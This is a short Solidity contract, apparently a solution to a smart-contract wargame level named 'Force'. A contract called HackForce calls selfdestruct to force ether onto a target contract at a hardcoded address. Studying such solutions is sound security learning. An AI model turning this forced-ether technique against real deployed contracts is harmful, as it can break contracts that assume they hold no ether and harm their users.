// SPDX-License-Identifier: MIT
pragma solidity >= 0.8.0 < 0.9.0;
import "./Force.sol";

contract HackForce {

    Force public vulnerableContract = Force(0x4080b17A35897f623aFD0a8B973F05446c39631a);

    function sendSchmoney() public payable {
        address payable vulnerableContractAddr = payable(address(vulnerableContract));
        selfdestruct(vulnerableContractAddr); 
    }
}